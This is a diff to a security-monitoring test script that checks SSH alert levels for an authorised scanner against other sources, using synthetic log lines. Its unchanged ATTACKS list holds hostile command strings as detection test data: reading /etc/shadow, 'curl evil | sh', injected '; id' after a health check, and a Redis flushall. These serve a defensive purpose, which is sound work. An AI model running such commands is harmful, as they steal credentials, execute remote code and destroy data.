@@ -12,6 +12,7 @@ mode logic), so docker events are tested with the exact shape the agents send. A
 case may also rewrite the command, to prove a non-health-check exec still alerts
 after the 87907 suppression.
 
+`must_fire.py scanner` (Phase 2d: scanner sshd events L3, other sources stock)
 `must_fire.py suppression` (Phase 1d: health checks level 0, look-alikes still 87907)
 `must_fire.py live <agent> <marker> [docker]` is Tier 2 (see must_fire_live_cases.json).
 
@@ -86,6 +87,45 @@ def run(cases_path=os.path.join(HERE, "must_fire_cases.json")):
     return failures
 
 
+def logtest_session(events, fmt="syslog", location="/var/log/auth.log"):
+    """Send events through ONE logtest session (needed for frequency rules); return (id, level) per event."""
+    token, out = None, []
+    for ev in events:
+        body = {"event": ev, "log_format": fmt, "location": location}
+        if token:
+            body["token"] = token
+        d = api_call("PUT", "/logtest", body)
+        token = d.get("token", token)
+        rule = d.get("output", {}).get("rule") or {}
+        out.append((str(rule.get("id", "")), int(rule.get("level", 0))))
+    return out
+
+
+def ssh_line(kind, ip, n=0):
+    msg = {"invalid": f"Invalid user admin{n} from {ip} port 4242", "failed": f"Failed password for root from {ip} port 4242 ssh2"}[kind]
+    return f"Oct 15 10:00:{n % 60:02d} testhost sshd[{1000 + n}]: {msg}"
+
+
+def scanner(scanner_ip="192.168.70.11"):
+    """Phase 2d: the scanner's sshd events are lowered to L3, every other source keeps stock levels."""
+    other = "203.0.113.5"
+    checks = []
+    for kind, stock, local in (("invalid", ("5710", 5), ("100200", 3)), ("failed", ("5760", 5), ("100202", 3))):
+        checks.append((f"{kind} login from another address", logtest_session([ssh_line(kind, other)])[0], stock))
+        checks.append((f"{kind} login from the scanner", logtest_session([ssh_line(kind, scanner_ip)])[0], local))
+    other_burst = logtest_session([ssh_line("invalid", other, i) for i in range(12)])
+    scan_burst = logtest_session([ssh_line("invalid", scanner_ip, i) for i in range(12)])
+    checks.append(("burst from another address reaches brute-force 5712 L10", max(other_burst, key=lambda x: x[1]), ("5712", 10)))
+    checks.append(("burst from the scanner never exceeds L3", max(scan_burst, key=lambda x: x[1]), None))
+    failures = 0
+    for name, got, want in checks:
+        ok = got[1] <= 3 if want is None else (got[0], got[1]) == want
+        failures += not ok
+        print(f"{'PASS' if ok else 'FAIL'}  {name}: fired {got[0] or 'none'} L{got[1]}" + ("" if want is None else f", want {want[0]} L{want[1]}"))
+    print(f"\n{'ALL PASS' if not failures else str(failures) + ' FAILED'}")
+    return failures
+
+
 ATTACKS = [  # execs that must keep alerting after 1d, including look-alikes of real health checks
     "/bin/bash", "cat /etc/shadow", "/bin/sh -c /usr/bin/healthcheck.sh; curl evil | sh",
     "/bin/sh -c x # /usr/bin/healthcheck.sh", "redis-cli -a pw ping; id", "redis-cli -a pw flushall",
@@ -148,6 +188,8 @@ def live(agent, marker, minutes=30, capabilities=()):
 
 
 if __name__ == "__main__":
+    if sys.argv[1:2] == ["scanner"]:
+        sys.exit(1 if scanner() else 0)
     if sys.argv[1:2] == ["suppression"]:
         sys.exit(1 if suppression(*sys.argv[2:3]) else 0)
     if sys.argv[1:2] == ["live"]:
